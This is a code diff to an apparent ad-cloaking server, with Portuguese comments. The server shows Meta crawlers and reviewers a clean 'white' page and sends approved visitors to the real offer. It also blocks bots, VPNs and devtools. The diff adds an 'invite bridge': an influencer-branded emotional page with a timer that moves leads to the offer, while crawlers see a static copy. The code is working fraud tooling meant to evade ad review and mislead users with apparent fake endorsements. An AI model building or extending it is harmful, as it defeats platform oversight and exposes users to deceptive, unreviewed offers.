@@ -20,7 +20,7 @@ const { normalizeAllowedBlockedCountries } = require('./services/siteService');
 const { createMetricsService } = require('./services/metricsService');
 const { createTelegramService } = require('./services/telegramService');
 const { createFallbackService } = require('./services/fallbackService');
-const { getStealthPagePack, getStealthWhiteGrayPack, listStealthThemes, resolveThemeKey } = require('./services/stealthPageTemplates');
+const { getStealthPagePack, getStealthWhiteGrayPack, listStealthThemes, resolveThemeKey, buildInviteBridgeHtml } = require('./services/stealthPageTemplates');
 
 const app = express();
 app.disable('x-powered-by');
@@ -1536,8 +1536,13 @@ app.post('/api/sites', async (req, res) => {
       safeRedirect = d ? ('https://' + d + '/') : safeRedirect;
     }
     if (!safeRedirect) safeRedirect = 'https://about.meta.com/';
-    await db.run(`INSERT INTO sites (site_id, link_code, user_id, name, domain, target_url, redirect_url, block_behavior, default_link_params, allowed_countries, blocked_countries, block_desktop, block_facebook_library, block_bots, block_vpn, block_devtools, required_ref_token, landing_page_id, gray_page_id, offer_page_id, offer_delivery, selected_domain, use_fallback, path_prefix, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, 1, 1, 1, 1, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`,
-      [siteId, linkCode, userId, name, domain, target, safeRedirect, behavior, defaultParams, countriesNorm.allowed, countriesNorm.blocked, refToken, lpId, grayId, offerPageId, offerDelivery, selDomain, useFb, pathPrefix]);
+    const bridgeStyle = behavior === 'stealth' ? normalizeBridgeStyle(req.body.bridge_style) : 'editorial';
+    const influencerName = (req.body.influencer_name || '').trim().slice(0, 80) || null;
+    const influencerPhoto = (req.body.influencer_photo_url || '').trim().slice(0, 500) || null;
+    const influencerBanner = (req.body.influencer_banner_url || '').trim().slice(0, 500) || null;
+    const bridgeTimer = clampBridgeTimer(req.body.bridge_timer_sec);
+    await db.run(`INSERT INTO sites (site_id, link_code, user_id, name, domain, target_url, redirect_url, block_behavior, default_link_params, allowed_countries, blocked_countries, block_desktop, block_facebook_library, block_bots, block_vpn, block_devtools, required_ref_token, landing_page_id, gray_page_id, offer_page_id, offer_delivery, selected_domain, use_fallback, path_prefix, bridge_style, influencer_name, influencer_photo_url, influencer_banner_url, bridge_timer_sec, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, 1, 1, 1, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`,
+      [siteId, linkCode, userId, name, domain, target, safeRedirect, behavior, defaultParams, countriesNorm.allowed, countriesNorm.blocked, refToken, lpId, grayId, offerPageId, offerDelivery, selDomain, useFb, pathPrefix, bridgeStyle, influencerName, influencerPhoto, influencerBanner, bridgeTimer]);
     const site = await db.get('SELECT * FROM sites WHERE site_id = ?', [siteId]);
     res.json({ ...site, auto_pages: autoPagesMeta });
   } catch (error) {
@@ -1573,12 +1578,18 @@ app.put('/api/sites/:siteId', async (req, res) => {
     const pathPrefixRegex = /^[a-z0-9_-]{1,32}$/i;
     let pathPrefix = (data.path_prefix != null && typeof data.path_prefix === 'string') ? data.path_prefix.trim().toLowerCase() : null;
     if (pathPrefix !== null && (!pathPrefix || !pathPrefixRegex.test(pathPrefix))) pathPrefix = null;
+    const bridgeStyle = blockBehavior === 'stealth' ? normalizeBridgeStyle(data.bridge_style) : (data.bridge_style ? normalizeBridgeStyle(data.bridge_style) : 'invite');
+    const influencerName = (data.influencer_name || '').trim().slice(0, 80) || null;
+    const influencerPhoto = (data.influencer_photo_url || '').trim().slice(0, 500) || null;
+    const influencerBanner = (data.influencer_banner_url || '').trim().slice(0, 500) || null;
+    const bridgeTimer = clampBridgeTimer(data.bridge_timer_sec != null ? data.bridge_timer_sec : 6);
     const sql = `
       UPDATE sites SET
         name = ?, domain = ?, link_code = ?, target_url = ?, redirect_url = ?, block_behavior = ?, default_link_params = ?,
         block_desktop = ?, block_facebook_library = ?, block_bots = ?,
         block_vpn = ?, block_devtools = ?,
-        allowed_countries = ?, blocked_countries = ?, is_active = ?, required_ref_token = ?, selected_domain = ?, landing_page_id = ?, gray_page_id = ?, offer_page_id = ?, offer_delivery = ?, use_fallback = ?, path_prefix = ?${clearFallback}
+        allowed_countries = ?, blocked_countries = ?, is_active = ?, required_ref_token = ?, selected_domain = ?, landing_page_id = ?, gray_page_id = ?, offer_page_id = ?, offer_delivery = ?, use_fallback = ?, path_prefix = ?,
+        bridge_style = ?, influencer_name = ?, influencer_photo_url = ?, influencer_banner_url = ?, bridge_timer_sec = ?${clearFallback}
       WHERE site_id = ?
     `;
     const countriesNorm = normalizeAllowedBlockedCountries(data.allowed_countries, data.blocked_countries);
@@ -1588,6 +1599,7 @@ app.put('/api/sites/:siteId', async (req, res) => {
       data.block_vpn ? 1 : 0, data.block_devtools ? 1 : 0,
       countriesNorm.allowed, countriesNorm.blocked, data.is_active ? 1 : 0, refToken,
       selDomain, lpId, grayId, offerPageId, offerDelivery, useFb, pathPrefix,
+      bridgeStyle, influencerName, influencerPhoto, influencerBanner, bridgeTimer,
       req.params.siteId
     ]);
     res.json({ success: true });
@@ -1711,7 +1723,7 @@ app.get('/api/sites/:siteId/link-health', async (req, res) => {
       level: zeroRedirect ? 'info' : 'medium',
       message: zeroRedirect
         ? 'Stealth + Zero-Redirect: crawler vê white page; lead aprovado recebe oferta na mesma URL (sem 302). Alinhe white page, gray page e oferta ao criativo do anúncio.'
-        : 'Stealth: crawler vê white limpa; lead liberado vai direto à oferta (302).'
+        : 'Stealth: crawler vê convite estático; lead vê o mesmo convite com timer e vai à oferta.';
     });
   }
   if (redirectChain.length > 2) {
@@ -2538,6 +2550,38 @@ function shouldSoftRedirectOffer(site) {
   return false; // substituído pela ponte unificada no modo stealth
 }
 
+/** White emocional (convite influenciador) — padrão no Stealth; editorial = matéria clássica. */
+function usesInviteBridge(site) {
+  if (!site || !wantsStealthBehavior(site)) return false;
+  const style = String(site.bridge_style || 'invite').toLowerCase().trim();
+  if (style === 'editorial' || style === 'article' || style === 'materia') return false;
+  return true;
+}
+
+function clampBridgeTimer(sec) {
+  const n = parseInt(sec, 10);
+  if (!Number.isFinite(n)) return 6;
+  return Math.max(2, Math.min(30, n));
+}
+
+function normalizeBridgeStyle(v) {
+  const s = String(v || 'invite').toLowerCase().trim();
+  if (s === 'editorial' || s === 'article' || s === 'materia') return 'editorial';
+  return 'invite';
+}
+
+function sendInviteBridgeResponse(res, site, options = {}) {
+  const html = buildInviteBridgeHtml({
+    influencerName: site.influencer_name || 'CONVIDADO',
+    photoUrl: site.influencer_photo_url || '',
+    bannerUrl: site.influencer_banner_url || site.influencer_photo_url || '',
+    timerSeconds: clampBridgeTimer(site.bridge_timer_sec),
+    destUrl: options.destUrl || '',
+    withTimer: !!options.withTimer
+  });
+  sendStealthHtmlResponse(res, html, { metaSafe: !!options.metaSafe });
+}
+
 /** Conteúdo neutro exibido a todos no modo Stealth (crawler e lead veem o mesmo HTML). */
 const STEALTH_DEFAULT_BRIDGE_HTML = `
 <article>
@@ -2686,7 +2730,7 @@ function stealthDeliveryLabel(kind) {
     white: 'White page',
     gray: 'Gray page',
     offer: 'Página da oferta (Zero-Redirect)',
-    soft_redirect: '→ Oferta (direto)',
+    soft_redirect: '→ Convite → Oferta',
     soft_redirect_ok: '→ Oferta CONFIRMADA ✓',
     redirect: '→ Oferta (legado)'
   };
@@ -3944,7 +3988,7 @@ function getMetaLinkConfigWarnings(site) {
     } else if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
       warnings.push({ level: 'info', code: 'stealth_zero_redirect', message: 'Zero-Redirect ativo: oferta entregue na mesma URL (página interna), sem salto para outro domínio.' });
     } else {
-      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Lead liberado vai direto à oferta (302). Crawler Meta recebe white limpa, sem JS de cloaker.' });
+      warnings.push({ level: 'medium', code: 'stealth_soft_offer', message: 'Lead liberado vê o convite exclusivo e segue sozinho à oferta após o timer. Crawler Meta vê o mesmo convite sem script de salto.' });
     }
     if (!site.gray_page_id) {
       warnings.push({ level: 'low', code: 'no_gray_page', message: 'Sem Gray Page: visitantes bloqueados ficam na white page. Configure uma página cinza (isca) em Páginas para bots e revisores.' });
@@ -4099,7 +4143,16 @@ async function handleStealthLinkGet(req, res, site) {
 
   const delivery = await resolveStealthDelivery(site, ctx);
 
-  // Lead → oferta NA HORA (302). Sem white no meio, sem clique.
+  // Lead + convite: white emocional com timer → oferta (sem 302 imediato, sem clique)
+  if ((delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') && usesInviteBridge(site)) {
+    return sendInviteBridgeResponse(res, site, {
+      destUrl: delivery.url || ctx.destWithQs,
+      withTimer: true,
+      metaSafe: false
+    });
+  }
+
+  // Lead → oferta NA HORA (302) só se bridge editorial / sem convite
   if (delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') {
     return sendStealthDelivery(res, site, { kind: 'soft_redirect', url: delivery.url || ctx.destWithQs });
   }
@@ -4107,7 +4160,10 @@ async function handleStealthLinkGet(req, res, site) {
     return sendStealthDelivery(res, site, delivery, { includeNavScript: false });
   }
 
-  // Crawler / revisor / bloqueado: só white/gray limpa (sem JS cloaker, sem CTA, sem /api/n/)
+  // Crawler / revisor / bloqueado: convite estático (sem timer) OU white/gray editorial limpa
+  if (delivery.kind === 'white' && usesInviteBridge(site)) {
+    return sendInviteBridgeResponse(res, site, { withTimer: false, metaSafe: true });
+  }
   return sendStealthDelivery(res, site, delivery, { includeNavScript: false, metaSafe: true });
 }
 
